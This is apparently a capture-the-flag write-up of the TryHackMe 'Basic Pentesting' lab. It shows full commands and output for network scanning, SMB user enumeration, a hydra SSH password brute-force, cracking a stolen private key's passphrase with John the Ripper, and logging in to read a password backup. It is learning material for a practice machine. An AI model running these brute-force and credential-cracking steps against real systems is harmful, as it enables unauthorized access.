Ran a basic nmap scan : 

```console 
nmap -A -sV -p- 10.10.156.80 --min-rate 5000 -oN nmap.txt
```
This was the output: 
```console 
──(roshan㉿redhood)-[~/Downloads/THM/basic_pentesting]
└─$ nmap -A -sV -p- 10.10.156.80 --min-rate 5000 -oN nmap.txt
#redacted
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  Protocol0   Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-01-22T05:25:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2024-01-22T00:25:03-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.86 seconds
```

We see that port 80 is open and running a web server. 
Ran a `gobuster` scan to get the following : 
```console 
┌──(roshan㉿redhood)-[~/Downloads/THM/basic_pentesting]
└─$ gobuster dir -u http://10.10.156.80:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
#redacted
/development          (Status: 301) [Size: 318] [--> http://10.10.156.80/development/]
Progress: 26133 / 220561 (11.85%)^C
```
The /development/j.txt and /development/dev.txt had the following:
```j.txt
For J:
I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.
-K
```
 
```dev.txt
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
With the mention of /etc/shadow, I assumed that this was with regards to the `ssh` server. 
I tried bruteforcing the login credentials to the `ssh` server, but it did not get me anywhere.
I tried enumerating the shares on the `smb` server to check for possible usernames. This was the output:
```console 
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```
2 users were found!
Let's try bruteforcing with `kay` and `jan`
```console 
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.156.80:22  
```
After awhile, we are able to get the login information for `jan`:
```console
└─$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.156.80:22
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-22 14:30:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.156.80:22/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344245 to do in 1532:31h, 14 active
[STATUS] 98.67 tries/min, 296 tries in 00:03h, 14344105 to do in 2422:60h, 14 active
[STATUS] 102.29 tries/min, 716 tries in 00:07h, 14343685 to do in 2337:12h, 14 active
[22][ssh] host: 10.10.156.80   login: jan   password: armando
```
Logging in as `jan`  and trying to enumerate for any vectors to escalate privileges, we come across the `.ssh` sub-directory under the `kay` directory. 
Here, we can find the private key that provides with a passphrase for login, under `id_rsa`.
I copied over the private key onto my own machine and performed the following to try and crack the key using JtR.
```
```console
┌──(roshan㉿redhood)-[~/Downloads/THM/basic_pentesting]
└─$ locate ssh2john.py    
/usr/share/john/ssh2john.py
                                                                                                                      
┌──(roshan㉿redhood)-[~/Downloads/THM/basic_pentesting]
└─$ python3 /usr/share/john/ssh2john.py id_rsa > decrypted.txt
                                                                                                                      
┌──(roshan㉿redhood)-[~/Downloads/THM/basic_pentesting]
└─$ ls                
decrypted.txt  id_rsa  nmap.txt
                                                                                                                      
┌──(roshan㉿redhood)-[~/Downloads/THM/basic_pentesting]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt decrypted.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2024-01-22 15:30) 7.142g/s 590971p/s 590971c/s 590971C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Using the passphrase, we can log in as kay:
```console 
┌──(roshan㉿redhood)-[~/Downloads/THM/basic_pentesting]
└─$ ssh -i id_rsa kay@10.10.156.80 -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ 
```
we can list the contents of the directory, where we find the `pass.bk`
```console
kay@basic2:~$ ls 
pass.bak
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
kay@basic2:~$ 

```